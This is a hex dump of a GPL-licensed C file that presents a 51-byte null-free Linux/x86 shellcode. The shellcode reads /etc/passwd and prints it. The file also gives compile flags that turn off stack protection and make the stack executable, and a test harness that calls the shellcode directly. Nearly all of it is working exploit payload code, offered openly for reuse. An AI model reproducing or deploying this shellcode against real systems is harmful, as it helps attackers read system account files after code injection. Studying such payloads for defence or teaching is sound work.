00000000  2f 2a 0a 0a 20 20 20 54  69 6e 79 20 52 65 61 64  |/*..   Tiny Read|
00000010  20 46 69 6c 65 20 53 68  65 6c 6c 63 6f 64 65 20  | File Shellcode |
00000020  2d 20 43 20 4c 61 6e 67  75 61 67 65 20 2d 20 4c  |- C Language - L|
00000030  69 6e 75 78 2f 78 38 36  0a 20 20 20 43 6f 70 79  |inux/x86.   Copy|
00000040  72 69 67 68 74 20 28 43  29 20 32 30 31 33 20 47  |right (C) 2013 G|
00000050  65 79 73 6c 61 6e 20 47  2e 20 42 65 6d 2c 20 48  |eyslan G. Bem, H|
00000060  61 63 6b 69 6e 67 20 62  69 74 73 0a 0a 20 20 20  |acking bits..   |
00000070  68 74 74 70 3a 2f 2f 68  61 63 6b 69 6e 67 62 69  |http://hackingbi|
00000080  74 73 2e 63 6f 6d 0a 20  20 20 67 65 79 73 6c 61  |ts.com.   geysla|
00000090  6e 40 67 6d 61 69 6c 2e  63 6f 6d 0a 0a 20 20 20  |n@gmail.com..   |
000000a0  54 68 69 73 20 70 72 6f  67 72 61 6d 20 69 73 20  |This program is |
000000b0  66 72 65 65 20 73 6f 66  74 77 61 72 65 3a 20 79  |free software: y|
000000c0  6f 75 20 63 61 6e 20 72  65 64 69 73 74 72 69 62  |ou can redistrib|
000000d0  75 74 65 20 69 74 20 61  6e 64 2f 6f 72 20 6d 6f  |ute it and/or mo|
000000e0  64 69 66 79 0a 20 20 20  69 74 20 75 6e 64 65 72  |dify.   it under|
000000f0  20 74 68 65 20 74 65 72  6d 73 20 6f 66 20 74 68  | the terms of th|
00000100  65 20 47 4e 55 20 47 65  6e 65 72 61 6c 20 50 75  |e GNU General Pu|
00000110  62 6c 69 63 20 4c 69 63  65 6e 73 65 20 61 73 20  |blic License as |
00000120  70 75 62 6c 69 73 68 65  64 20 62 79 0a 20 20 20  |published by.   |
00000130  74 68 65 20 46 72 65 65  20 53 6f 66 74 77 61 72  |the Free Softwar|
00000140  65 20 46 6f 75 6e 64 61  74 69 6f 6e 2c 20 65 69  |e Foundation, ei|
00000150  74 68 65 72 20 76 65 72  73 69 6f 6e 20 33 20 6f  |ther version 3 o|
00000160  66 20 74 68 65 20 4c 69  63 65 6e 73 65 2c 20 6f  |f the License, o|
00000170  72 0a 20 20 20 28 61 74  20 79 6f 75 72 20 6f 70  |r.   (at your op|
00000180  74 69 6f 6e 29 20 61 6e  79 20 6c 61 74 65 72 20  |tion) any later |
00000190  76 65 72 73 69 6f 6e 2e  0a 0a 20 20 20 54 68 69  |version...   Thi|
000001a0  73 20 70 72 6f 67 72 61  6d 20 69 73 20 64 69 73  |s program is dis|
000001b0  74 72 69 62 75 74 65 64  20 69 6e 20 74 68 65 20  |tributed in the |
000001c0  68 6f 70 65 20 74 68 61  74 20 69 74 20 77 69 6c  |hope that it wil|
000001d0  6c 20 62 65 20 75 73 65  66 75 6c 2c 0a 20 20 20  |l be useful,.   |
000001e0  62 75 74 20 57 49 54 48  4f 55 54 20 41 4e 59 20  |but WITHOUT ANY |
000001f0  57 41 52 52 41 4e 54 59  3b 20 77 69 74 68 6f 75  |WARRANTY; withou|
00000200  74 20 65 76 65 6e 20 74  68 65 20 69 6d 70 6c 69  |t even the impli|
00000210  65 64 20 77 61 72 72 61  6e 74 79 20 6f 66 0a 20  |ed warranty of. |
00000220  20 20 4d 45 52 43 48 41  4e 54 41 42 49 4c 49 54  |  MERCHANTABILIT|
00000230  59 20 6f 72 20 46 49 54  4e 45 53 53 20 46 4f 52  |Y or FITNESS FOR|
00000240  20 41 20 50 41 52 54 49  43 55 4c 41 52 20 50 55  | A PARTICULAR PU|
00000250  52 50 4f 53 45 2e 20 20  53 65 65 20 74 68 65 0a  |RPOSE.  See the.|
00000260  20 20 20 47 4e 55 20 47  65 6e 65 72 61 6c 20 50  |   GNU General P|
00000270  75 62 6c 69 63 20 4c 69  63 65 6e 73 65 20 66 6f  |ublic License fo|
00000280  72 20 6d 6f 72 65 20 64  65 74 61 69 6c 73 2e 0a  |r more details..|
00000290  0a 20 20 20 59 6f 75 20  73 68 6f 75 6c 64 20 68  |.   You should h|
000002a0  61 76 65 20 72 65 63 65  69 76 65 64 20 61 20 63  |ave received a c|
000002b0  6f 70 79 20 6f 66 20 74  68 65 20 47 4e 55 20 47  |opy of the GNU G|
000002c0  65 6e 65 72 61 6c 20 50  75 62 6c 69 63 20 4c 69  |eneral Public Li|
000002d0  63 65 6e 73 65 0a 20 20  20 61 6c 6f 6e 67 20 77  |cense.   along w|
000002e0  69 74 68 20 74 68 69 73  20 70 72 6f 67 72 61 6d  |ith this program|
000002f0  2e 20 20 49 66 20 6e 6f  74 2c 20 73 65 65 20 3c  |.  If not, see <|
00000300  68 74 74 70 3a 2f 2f 77  77 77 2e 67 6e 75 2e 6f  |http://www.gnu.o|
00000310  72 67 2f 6c 69 63 65 6e  73 65 73 2f 3e 2e 0a 0a  |rg/licenses/>...|
00000320  2a 2f 0a 0a 2f 2a 0a 0a  20 20 20 74 69 6e 79 5f  |*/../*..   tiny_|
00000330  72 65 61 64 5f 66 69 6c  65 5f 73 68 65 6c 6c 63  |read_file_shellc|
00000340  6f 64 65 0a 0a 20 20 20  2a 20 35 31 20 62 79 74  |ode..   * 51 byt|
00000350  65 73 0a 20 20 20 2a 20  6e 75 6c 6c 2d 66 72 65  |es.   * null-fre|
00000360  65 0a 20 20 20 2a 20 72  65 61 64 20 34 30 39 36  |e.   * read 4096|
00000370  20 62 79 74 65 73 20 66  72 6f 6d 20 2f 65 74 63  | bytes from /etc|
00000380  2f 70 61 73 73 77 64 20  66 69 6c 65 0a 0a 0a 20  |/passwd file... |
00000390  20 20 23 20 67 63 63 20  2d 6d 33 32 20 2d 66 6e  |  # gcc -m32 -fn|
000003a0  6f 2d 73 74 61 63 6b 2d  70 72 6f 74 65 63 74 6f  |o-stack-protecto|
000003b0  72 20 2d 7a 20 65 78 65  63 73 74 61 63 6b 20 74  |r -z execstack t|
000003c0  69 6e 79 5f 72 65 61 64  5f 66 69 6c 65 5f 73 68  |iny_read_file_sh|
000003d0  65 6c 6c 63 6f 64 65 2e  63 20 2d 6f 20 74 69 6e  |ellcode.c -o tin|
000003e0  79 5f 72 65 61 64 5f 66  69 6c 65 5f 73 68 65 6c  |y_read_file_shel|
000003f0  6c 63 6f 64 65 0a 0a 20  20 20 54 65 73 74 69 6e  |lcode..   Testin|
00000400  67 0a 20 20 20 23 20 2e  2f 74 69 6e 79 5f 72 65  |g.   # ./tiny_re|
00000410  61 64 5f 66 69 6c 65 5f  73 68 65 6c 6c 63 6f 64  |ad_file_shellcod|
00000420  65 0a 0a 2a 2f 0a 0a 0a  23 69 6e 63 6c 75 64 65  |e..*/...#include|
00000430  20 3c 73 74 64 69 6f 2e  68 3e 0a 23 69 6e 63 6c  | <stdio.h>.#incl|
00000440  75 64 65 20 3c 73 74 72  69 6e 67 2e 68 3e 0a 0a  |ude <string.h>..|
00000450  75 6e 73 69 67 6e 65 64  20 63 68 61 72 20 73 68  |unsigned char sh|
00000460  65 6c 6c 63 6f 64 65 5b  5d 20 3d 20 5c 0a 0a 20  |ellcode[] = \.. |
00000470  20 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |             "\x|
00000480  33 31 5c 78 63 39 5c 78  66 37 5c 78 65 31 5c 78  |31\xc9\xf7\xe1\x|
00000490  62 30 5c 78 30 35 5c 78  35 31 5c 78 36 38 5c 78  |b0\x05\x51\x68\x|
000004a0  37 33 5c 78 37 33 22 0a  20 20 20 20 20 20 20 20  |73\x73".        |
000004b0  20 20 20 20 20 20 22 5c  78 37 37 5c 78 36 34 5c  |      "\x77\x64\|
000004c0  78 36 38 5c 78 36 33 5c  78 32 66 5c 78 37 30 5c  |x68\x63\x2f\x70\|
000004d0  78 36 31 5c 78 36 38 5c  78 32 66 5c 78 32 66 22  |x61\x68\x2f\x2f"|
000004e0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 22  |.              "|
000004f0  5c 78 36 35 5c 78 37 34  5c 78 38 39 5c 78 65 33  |\x65\x74\x89\xe3|
00000500  5c 78 63 64 5c 78 38 30  5c 78 39 33 5c 78 39 31  |\xcd\x80\x93\x91|
00000510  5c 78 62 30 5c 78 30 33  22 0a 20 20 20 20 20 20  |\xb0\x03".      |
00000520  20 20 20 20 20 20 20 20  22 5c 78 33 31 5c 78 64  |        "\x31\xd|
00000530  32 5c 78 36 36 5c 78 62  61 5c 78 66 66 5c 78 30  |2\x66\xba\xff\x0|
00000540  66 5c 78 34 32 5c 78 63  64 5c 78 38 30 5c 78 39  |f\x42\xcd\x80\x9|
00000550  32 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |2".             |
00000560  20 22 5c 78 33 31 5c 78  63 30 5c 78 62 30 5c 78  | "\x31\xc0\xb0\x|
00000570  30 34 5c 78 62 33 5c 78  30 31 5c 78 63 64 5c 78  |04\xb3\x01\xcd\x|
00000580  38 30 5c 78 39 33 5c 78  63 64 22 0a 20 20 20 20  |80\x93\xcd".    |
00000590  20 20 20 20 20 20 20 20  20 20 22 5c 78 38 30 22  |          "\x80"|
000005a0  3b 0a 0a 0a 6d 61 69 6e  20 28 29 0a 7b 0a 0a 20  |;...main ().{.. |
000005b0  20 20 20 2f 2f 20 57 68  65 6e 20 63 6f 6e 74 61  |   // When conta|
000005c0  69 6e 73 20 6e 75 6c 6c  20 62 79 74 65 73 2c 20  |ins null bytes, |
000005d0  70 72 69 6e 74 66 20 77  69 6c 6c 20 73 68 6f 77  |printf will show|
000005e0  20 61 20 77 72 6f 6e 67  20 73 68 65 6c 6c 63 6f  | a wrong shellco|
000005f0  64 65 20 6c 65 6e 67 74  68 2e 0a 0a 20 20 20 20  |de length...    |
00000600  70 72 69 6e 74 66 28 22  53 68 65 6c 6c 63 6f 64  |printf("Shellcod|
00000610  65 20 4c 65 6e 67 74 68  3a 20 20 25 64 5c 6e 22  |e Length:  %d\n"|
00000620  2c 20 73 74 72 6c 65 6e  28 73 68 65 6c 6c 63 6f  |, strlen(shellco|
00000630  64 65 29 29 3b 0a 0a 20  20 20 20 2f 2f 20 50 6f  |de));..    // Po|
00000640  6c 6c 75 74 65 73 20 61  6c 6c 20 72 65 67 69 73  |llutes all regis|
00000650  74 65 72 73 20 65 6e 73  75 72 69 6e 67 20 74 68  |ters ensuring th|
00000660  61 74 20 74 68 65 20 73  68 65 6c 6c 63 6f 64 65  |at the shellcode|
00000670  20 72 75 6e 73 20 69 6e  20 61 6e 79 20 63 69 72  | runs in any cir|
00000680  63 75 6d 73 74 61 6e 63  65 2e 0a 0a 20 20 20 20  |cumstance...    |
00000690  5f 5f 61 73 6d 5f 5f 20  28 22 6d 6f 76 6c 20 24  |__asm__ ("movl $|
000006a0  30 78 66 66 66 66 66 66  66 66 2c 20 25 65 61 78  |0xffffffff, %eax|
000006b0  5c 6e 5c 74 22 0a 20 20  20 20 20 20 20 20 20 20  |\n\t".          |
000006c0  20 20 22 6d 6f 76 6c 20  25 65 61 78 2c 20 25 65  |  "movl %eax, %e|
000006d0  62 78 5c 6e 5c 74 22 0a  20 20 20 20 20 20 20 20  |bx\n\t".        |
000006e0  20 20 20 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |    "movl %eax, |
000006f0  25 65 63 78 5c 6e 5c 74  22 0a 20 20 20 20 20 20  |%ecx\n\t".      |
00000700  20 20 20 20 20 20 22 6d  6f 76 6c 20 25 65 61 78  |      "movl %eax|
00000710  2c 20 25 65 64 78 5c 6e  5c 74 22 0a 20 20 20 20  |, %edx\n\t".    |
00000720  20 20 20 20 20 20 20 20  22 6d 6f 76 6c 20 25 65  |        "movl %e|
00000730  61 78 2c 20 25 65 73 69  5c 6e 5c 74 22 0a 20 20  |ax, %esi\n\t".  |
00000740  20 20 20 20 20 20 20 20  20 20 22 6d 6f 76 6c 20  |          "movl |
00000750  25 65 61 78 2c 20 25 65  64 69 5c 6e 5c 74 22 0a  |%eax, %edi\n\t".|
00000760  20 20 20 20 20 20 20 20  20 20 20 20 22 6d 6f 76  |            "mov|
00000770  6c 20 25 65 61 78 2c 20  25 65 62 70 5c 6e 5c 74  |l %eax, %ebp\n\t|
00000780  22 0a 0a 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"..            /|
00000790  2f 20 43 61 6c 6c 69 6e  67 20 74 68 65 20 73 68  |/ Calling the sh|
000007a0  65 6c 6c 63 6f 64 65 0a  20 20 20 20 20 20 20 20  |ellcode.        |
000007b0  20 20 20 20 22 63 61 6c  6c 20 73 68 65 6c 6c 63  |    "call shellc|
000007c0  6f 64 65 22 29 3b 0a 0a  7d                       |ode");..}|
000007c9
